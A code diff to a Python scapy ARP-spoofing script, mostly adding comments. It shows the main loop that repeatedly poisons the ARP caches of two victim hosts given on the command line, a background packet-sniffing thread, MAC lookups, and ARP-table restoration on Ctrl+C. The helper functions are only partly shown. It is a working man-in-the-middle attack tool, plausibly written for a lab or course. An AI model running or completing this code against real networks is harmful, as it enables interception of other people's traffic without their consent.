@@ -58,7 +58,7 @@ def restore_arp():
     # Send each packet multiple times to ensure delivery
     sendp(pkt1, iface=ATTACKER_INTERFACE, count=3, verbose=False)
     sendp(pkt2, iface=ATTACKER_INTERFACE, count=3, verbose=False)
-    print(f"{GREEN}ARP tables restored.{RESET}")
+    print(f"{GREEN}ARP tables restored{RESET}")
 
 
 def sniff_packets():
@@ -77,6 +77,7 @@ def sniff_packets():
 def main():
     global victim1_ip, victim2_ip, victim1_mac, victim2_mac, attacker_mac
 
+    # Check for correct usage
     if len(sys.argv) != 3:
         print(f"{RED}Error: Incorrect Usage!{RESET}")
         print(
@@ -86,6 +87,7 @@ def main():
     victim1_ip = sys.argv[1]
     victim2_ip = sys.argv[2]
 
+    # Get the MAC addresses of the attacker and victims
     attacker_mac = get_if_hwaddr(ATTACKER_INTERFACE)
     victim1_mac = get_mac(victim1_ip)
     victim2_mac = get_mac(victim2_ip)
@@ -94,26 +96,35 @@ def main():
         print(f"{RED}Error: Failed to obtain victim MAC addresses. Exiting.{RESET}")
         sys.exit(1)
 
+    # Print the MAC addresses
     print(f"{BLUE}Attacker MAC: {attacker_mac}{RESET}")
     print(f"{BLUE}Victim 1: {victim1_ip} (IP), {victim1_mac} (MAC){RESET}")
     print(f"{BLUE}Victim 2: {victim2_ip} (IP), {victim2_mac} (MAC){RESET}")
 
+    # Handle Ctrl+C to stop the script
     def handle_exit(sig, frame):
         print(f"\n{YELLOW}Ctrl+C received. Stopping ARP spoofing...{RESET}")
+
+        # Restore ARP tables before exiting
         restore_arp()
         sys.exit(0)
 
     signal.signal(signal.SIGINT, handle_exit)
 
+    # Start sniffing in a background thread
     sniff_thread = Thread(target=sniff_packets, daemon=True)
     sniff_thread.start()
 
     print("Starting ARP spoofing... Press Ctrl+C to stop.")
     try:
+
+        # Continuously send ARP spoofing packets
         while True:
             spoof_arp(victim1_ip, victim1_mac, victim2_ip)
             spoof_arp(victim2_ip, victim2_mac, victim1_ip)
             time.sleep(2)
+
+    # Handle Ctrl+C interrupt
     except KeyboardInterrupt:
         handle_exit(None, None)
 
